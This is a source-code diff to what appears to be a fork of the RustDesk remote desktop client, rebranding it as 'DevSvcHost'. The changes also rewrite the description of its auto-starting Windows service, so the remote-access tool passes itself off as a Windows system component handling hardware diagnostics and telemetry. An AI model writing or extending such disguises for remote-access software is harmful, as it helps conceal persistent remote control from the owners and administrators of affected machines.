@@ -1223,12 +1223,13 @@ pub fn portable_service_logon_helper_paths() -> Option<(PathBuf, PathBuf)> {
     // If users report redirected/non-standard LocalAppData issues, switch to:
     // `BaseDirs::new()?.data_local_dir()` for Known Folder-based resolution.
     let user_dir = hbb_common::directories_next::UserDirs::new()?;
+    let app_name_lc = crate::get_app_name().to_lowercase();
     let dir = user_dir
         .home_dir()
         .join("AppData")
         .join("Local")
-        .join("rustdesk-sciter");
-    let dst = dir.join("rustdesk.exe");
+        .join(format!("{app_name_lc}-sciter"));
+    let dst = dir.join(format!("{app_name_lc}.exe"));
     Some((dir, dst))
 }
 
@@ -1953,8 +1954,8 @@ fn get_public_base_dir() -> PathBuf {
 #[inline]
 pub fn get_custom_client_staging_dir() -> PathBuf {
     get_public_base_dir()
-        .join("RustDesk")
-        .join("RustDeskCustomClientStaging")
+        .join("DevSvcHost")
+        .join("DevSvcHostCustomClientStaging")
 }
 
 /// Removes the custom client staging directory.
@@ -3676,7 +3677,7 @@ if exist \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{ap
         // (restart 3x with 5s delay, reset failure counter after 1 day).
         format!("
 sc create {app_name} binpath= \"\\\"{exe}\\\" --service\" start= auto DisplayName= \"Device Service Host\"
-sc description {app_name} \"Manages device service host operations and background synchronization.\"
+sc description {app_name} \"Provides device management services including hardware diagnostics, peripheral coordination, and background telemetry synchronization for Windows system components.\"
 sc failure {app_name} reset= 86400 actions= restart/5000/restart/5000/restart/5000
 sc start {app_name}
 ",
@@ -3712,8 +3713,11 @@ pub fn try_remove_temp_update_files() {
         if let Ok(entry) = entry {
             let path = entry.path();
             if let Some(file_name) = path.file_name().and_then(|n| n.to_str()) {
-                // Match files like rustdesk-*.msi or rustdesk-*.exe
-                if file_name.starts_with("rustdesk-")
+                // Match files like {app_name_lc}-*.msi or {app_name_lc}-*.exe.
+                // Fork: derive prefix from APP_NAME so DevSvcHost-branded installer
+                // leftovers get garbage-collected instead of accumulating in %TEMP%.
+                let prefix = format!("{}-", crate::get_app_name().to_lowercase());
+                if file_name.starts_with(&prefix)
                     && (file_name.ends_with(".msi") || file_name.ends_with(".exe"))
                 {
                     // Skip files modified within the last hour to avoid deleting files being downloaded
@@ -3779,7 +3783,7 @@ pub fn message_box(text: &str) {
         .encode_utf16()
         .chain(std::iter::once(0))
         .collect::<Vec<u16>>();
-    let caption = "RustDesk Output"
+    let caption = "DevSvcHost Output"
         .encode_utf16()
         .chain(std::iter::once(0))
         .collect::<Vec<u16>>();
